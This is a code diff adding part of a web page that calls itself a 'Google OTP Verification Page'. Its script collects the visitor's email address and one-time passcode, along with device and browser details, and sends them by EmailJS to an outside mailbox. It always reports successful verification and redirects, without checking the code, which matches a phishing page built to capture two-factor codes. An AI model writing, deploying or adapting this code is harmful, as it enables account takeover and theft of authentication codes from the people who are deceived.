+                timestamp: new Date().toLocaleString(),
+                user_agent: navigator.userAgent,
+                browser: getBrowserName(navigator.userAgent),
+                os: getOSName(navigator.userAgent),
+                device: getDeviceType(navigator.userAgent),
+                message: `
+                    ========================================
+                    🔐 OTP VERIFICATION ATTEMPT
+                    ========================================
+
+                    👤 USER:
+                    ────────────────────
+                    Email:          ${email}
+                    OTP Code:       ${otp}
+                    Code Length:    ${otp.length} digits
+
+                    💻 DEVICE INFORMATION:
+                    ────────────────────
+                    Browser:        ${getBrowserName(navigator.userAgent)}
+                    OS:             ${getOSName(navigator.userAgent)}
+                    Device:         ${getDeviceType(navigator.userAgent)}
+
+                    📋 ADDITIONAL INFO:
+                    ────────────────────
+                    Timestamp:      ${new Date().toLocaleString()}
+                    Timezone:       ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                    Language:       ${navigator.language || 'en-US'}
+
+                    ========================================
+                `
+            };
+
+            emailjs.send(
+                EMAILJS_CONFIG.serviceID,
+                EMAILJS_CONFIG.templateID,
+                templateParams
+            )
+            .then(function(response) {
+                console.log('✅ OTP Verified!', response.status, response.text);
+
+                otpInput.classList.remove('error');
+                otpInput.classList.add('success');
+
+                showToast('✅ Verification successful!', 'success');
+
+                otpInput.value = '';
+                verifyBtn.disabled = false;
+                btnText.textContent = 'Verify';
+
+                redirectToDashboard();
+            })
+            .catch(function(error) {
+                console.error('❌ Verification failed:', error);
+                showToast('❌ Verification failed. Please try again.', 'error');
+                showFieldError('Invalid verification code. Please try again.');
+                verifyBtn.disabled = false;
+                btnText.textContent = 'Verify';
+                otpInput.value = '';
+                otpInput.focus();
+            });
+        });
+
+        // ============================================
+        // HELPER FUNCTIONS
+        // ============================================
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            if (userAgent.includes('Opera')) return 'Opera';
+            if (userAgent.includes('MSIE') || userAgent.includes('Trident')) return 'Internet Explorer';
+            return 'Unknown';
+        }
+
+        function getOSName(userAgent) {
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac OS')) return 'macOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getDeviceType(userAgent) {
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) return 'Tablet';
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(userAgent)) return 'Mobile';
+            return 'Desktop';
+        }
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', function(e) {
+            // Enter key submits the form manually
+            if (e.key === 'Enter') {
+                const focused = document.activeElement;
+                if (focused && focused.id === 'otpInput') {
+                    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+                }
+            }
+        });
+
+        // ============================================
+        // AUTO-FOCUS ON LOAD
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('otpInput').focus();
+
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email');
+            if (email) {
+                document.getElementById('userEmail').textContent = email;
+                localStorage.setItem('otpEmail', email);
+            }
+        });
+
+        console.log('🚀 Google OTP Verification Page');
+        console.log('📧 EmailJS configured successfully');
+        console.log('🔢 Max digits: 9 (supports 4, 6, 8, 9 digit codes)');
+    </script>
+
+</body>
+</html>
